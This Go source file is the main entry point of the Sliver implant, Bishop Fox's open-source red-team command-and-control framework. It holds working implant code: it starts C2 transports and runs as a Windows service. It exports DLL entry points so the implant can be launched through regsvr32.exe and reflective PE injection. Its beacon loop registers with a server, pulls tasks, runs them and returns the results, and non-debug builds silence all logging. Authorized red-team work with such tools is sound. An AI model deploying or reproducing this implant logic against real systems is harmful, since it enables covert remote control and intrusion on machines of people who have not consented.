package main

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if or .Config.IsSharedLib .Config.IsShellcode}}
//#include "sliver.h"
import "C"

// {{end}}

import (
	// {{if .Config.Debug}}

	consts "github.com/bishopfox/sliver/implant/sliver/constants"

	// {{end}}

	// {{if .Config.Debug}}{{else}}
	"io/ioutil"
	// {{end}}

	// {{if .Config.IsBeacon}}

	"log"
	"sync"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/handlers"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/gofrs/uuid"

	// {{end}}

	// {{if .Config.IsService}}
	"golang.org/x/sys/windows/svc"
	// {{end}}

	"google.golang.org/protobuf/proto"
	"google.golang.org/protobuf/reflect/protoreflect"

	"github.com/bishopfox/sliver/implant/sliver/limits"
	"github.com/bishopfox/sliver/implant/sliver/transports/c2"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// {{if .Config.IsBeacon}}
var (
	BeaconID string
)

func init() {
	id, err := uuid.NewV4()
	if err != nil {
		BeaconID = "00000000-0000-0000-0000-000000000000"
	}
	BeaconID = id.String()
}

// {{end}}

// {{if .Config.IsService}}

type sliverService struct{}

func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown | svc.AcceptPauseAndContinue
	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
	for {
		select {
		default:
			// Initialize and start the implant transports
			err := c2.Transports.Init()
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("Error starting transports: %s", err.Error())
				// {{end}}
				break
			}

			// Block and let the C2s serve this implant
			c2.Transports.Serve()

		case c := <-r:
			switch c.Cmd {
			case svc.Interrogate:
				changes <- c.CurrentStatus
			case svc.Stop, svc.Shutdown:
				changes <- svc.Status{State: svc.Stopped, Accepts: cmdsAccepted}
			case svc.Pause:
				changes <- svc.Status{State: svc.Paused, Accepts: cmdsAccepted}
			case svc.Continue:
				changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
			default:
			}
		}
	}
	return
}

// {{end}}

// {{if or .Config.IsSharedLib .Config.IsShellcode}}
var isRunning bool = false

// RunSliver - Export for shared lib build
//export RunSliver
func RunSliver() {
	if !isRunning {
		isRunning = true
		main()
	}
}

// Thanks Ne0nd0g for those
//https://github.com/Ne0nd0g/merlin/blob/master/cmd/merlinagentdll/main.go#L65

// VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
//export VoidFunc
func VoidFunc() { main() }

// DllInstall is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /n /i sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
//export DllInstall
func DllInstall() { main() }

// DllRegisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
// export DllRegisterServer
func DllRegisterServer() { main() }

// DllUnregisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /u sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
// export DllUnregisterServer
func DllUnregisterServer() { main() }

// {{end}}

func main() {

	// {{if .Config.Debug}}
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	// {{else}}
	log.SetFlags(0)
	log.SetOutput(ioutil.Discard)
	// {{end}}

	// {{if .Config.Debug}}
	log.Printf("Hello my name is %s", consts.SliverName)
	// {{end}}

	limits.ExecLimits() // Check to see if we should execute

	// {{if .Config.IsService}}
	svc.Run("", &sliverService{})
	// {{else}}

	// {{if .Config.Debug}}
	// log.Printf("Running in Beacon mode with ID: %s", BeaconID)
	// {{end}}

	for {
		// Initialize and start the implant transports
		err := c2.Transports.Init()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error starting transports: %s", err.Error())
			// {{end}}
			break
		}

		// Block and let the C2s serve this implant
		c2.Transports.Serve()
	}
	// {{if .Config.Debug}}
	log.Printf("Running in session mode")
	// {{end}}

	// {{end}}
}

// {{if .Config.IsBeacon}}
var (
	beaconErrors = 0
)

func beaconMainLoop(beacon *transports.Beacon) error {
	// Register beacon
	err := beacon.Start()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error starting beacon: %s", err)
		// {{end}}
		beaconErrors++
		if transports.GetMaxConnectionErrors() < beaconErrors {
			return err
		}
		return nil
	}
	// {{if .Config.Debug}}
	log.Printf("Registering beacon with server")
	// {{end}}
	nextBeacon := time.Now().Add(beacon.Duration())
	beacon.Send(Envelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
		ID:          BeaconID,
		Interval:    beacon.Interval(),
		Jitter:      beacon.Jitter(),
		NextCheckin: nextBeacon.UTC().Unix(),
	}))
	beacon.Close()

	time.Sleep(time.Second)

	// BeaconMain - Is executed in it's own goroutine as the function will block
	// until all tasks complete (in success or failure), if a task handler blocks
	// forever it will simply block this set of tasks instead of the entire beacon
	intervalErrors := 0
	for {
		if transports.GetMaxConnectionErrors() < intervalErrors {
			break
		}
		duration := beacon.Duration()
		nextBeacon = time.Now().Add(duration)
		go func() {
			err := beaconMain(beacon, nextBeacon)
			if err != nil {
				intervalErrors++
				// {{if .Config.Debug}}
				log.Printf("[beacon] main %s", err)
				// {{end}}
			}
		}()

		// {{if .Config.Debug}}
		log.Printf("[beacon] sleep until %v", nextBeacon)
		// {{end}}
		time.Sleep(duration)
	}
	return nil
}

func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
	err := beacon.Start()
	if err != nil {
		return err
	}
	defer beacon.Close()
	err = beacon.Send(Envelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
		ID:          BeaconID,
		NextCheckin: nextCheckin.UTC().Unix(),
	}))
	if err != nil {
		return err
	}
	envelope, err := beacon.Recv()
	if err != nil {
		return err
	}
	tasks := &sliverpb.BeaconTasks{}
	err = proto.Unmarshal(envelope.Data, tasks)
	if err != nil {
		return err
	}

	// {{if .Config.Debug}}
	log.Printf("[beacon] Received %d task(s) from server", len(tasks.Tasks))
	// {{end}}
	if len(tasks.Tasks) == 0 {
		return nil
	}

	results := []*sliverpb.Envelope{}
	resultsMutex := &sync.Mutex{}
	wg := &sync.WaitGroup{}
	sysHandlers := handlers.GetSystemHandlers()

	for _, task := range tasks.Tasks {
		// {{if .Config.Debug}}
		log.Printf("[beacon] execute task %#v", task)
		// {{end}}
		if handler, ok := sysHandlers[task.Type]; ok {
			wg.Add(1)
			data := task.Data
			taskID := task.ID
			go handler(data, func(data []byte, err error) {
				resultsMutex.Lock()
				defer resultsMutex.Unlock()
				defer wg.Done()
				// {{if .Config.Debug}}
				if err != nil {
					// {{if .Config.Debug}}
					log.Printf("[beacon] handler function returned an error: %s", err)
					// {{end}}
				}
				// {{end}}
				// {{if .Config.Debug}}
				log.Printf("[beacon] task completed (id: %d)", taskID)
				// {{end}}
				results = append(results, &sliverpb.Envelope{
					ID:   taskID,
					Data: data,
				})
			})
		} else {
			resultsMutex.Lock()
			defer resultsMutex.Unlock()
			results = append(results, &sliverpb.Envelope{
				ID:                 task.ID,
				UnknownMessageType: true,
			})
		}
	}

	wg.Wait() // Wait for all tasks to complete
	// {{if .Config.Debug}}
	log.Printf("[beacon] all tasks completed, sending results to server")
	// {{end}}

	err = beacon.Send(Envelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
		ID:    BeaconID,
		Tasks: results,
	}))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] Error sending results %s", err)
		// {{end}}
	}
	// {{if .Config.Debug}}
	log.Printf("[beacon] all results sent to server, cleanup ...")
	// {{end}}
	return nil
}

// {{end}}

// Envelope - Creates an envelope with the given type and data.
func Envelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.Envelope {
	data, err := proto.Marshal(message)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to encode register msg %s", err)
		// {{end}}
		return nil
	}
	return &sliverpb.Envelope{
		Type: msgType,
		Data: data,
	}
}
